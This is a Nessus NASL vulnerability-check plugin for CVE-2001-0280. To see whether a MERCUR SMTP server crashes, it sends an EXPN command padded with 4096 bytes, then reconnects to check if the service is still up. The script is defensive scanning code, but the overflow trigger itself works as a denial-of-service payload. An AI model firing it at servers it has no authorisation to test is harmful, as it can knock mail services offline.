#
# (C) Tenable Network Security, Inc.
#

# Script audit and contributions from Carmichael Security
#      Erik Anderson <eanders@carmichaelsecurity.com> (nb: this domain no longer exists)
#      Added BugtraqID

include("compat.inc");

if (description)
{
 script_id(10620);
 script_version("$Revision: 1.32 $");
 script_cvs_date("$Date: 2016/10/27 15:03:55 $");

 script_cve_id("CVE-2001-0280");
 script_bugtraq_id(2412);
 script_osvdb_id(6027);

 script_name(english:"MERCUR SMTP Server EXPN Command Remote Overflow");
 script_summary(english:"EXPN and VRFY checks");

 script_set_attribute(attribute:"synopsis", value:"The remote SMTP server has a buffer overflow vulnerability.");
 script_set_attribute(attribute:"description", value:
"It was possible to make the remote mail server crash when issuing a
very long argument to the EXPN command. A remote attacker could
exploit this flaw to crash the service, or possibly execute arbitrary
code.");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2001/Feb/259");
 script_set_attribute(attribute:"solution", value:"Upgrade to the latest version of this software.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"2001/02/23");
 script_set_attribute(attribute:"plugin_publication_date", value:"2001/02/26");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_family(english:"SMTP problems");

 script_copyright(english:"This script is Copyright (C) 2001-2016 Tenable Network Security, Inc.");

 script_dependencie("smtpserver_detect.nasl");
 script_require_keys("Settings/ParanoidReport");
 script_require_ports("Services/smtp", 25);

 exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("smtp_func.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = get_kb_item("Services/smtp");
if(!port)port = 25;
if(!get_port_state(port))exit(0);


soc = open_sock_tcp(port);
 if(soc)
 {
  b = smtp_recv_banner(socket:soc);
  if(!b){
	close(soc);
	exit(0);
	}


  s = string("HELO example.com\r\n");
  send(socket:soc, data:s);
  r = recv_line(socket:soc, length:1024);
  # MA 2005-03-07: 200 bytes are enough for Mercure (?), but not for SLMail
  s = string("EXPN ", crap(4096), "\r\nQUIT\r\n");
  send(socket:soc, data:s);
  #r = recv_line(socket:soc, length:1024);
  close(soc);

  #sleep(1);

  soc2 = open_sock_tcp(port);
  if(!soc2)security_hole(port);

  r = smtp_recv_banner(socket:soc2);
  close(soc2);
  if(!r)security_hole(port);
}
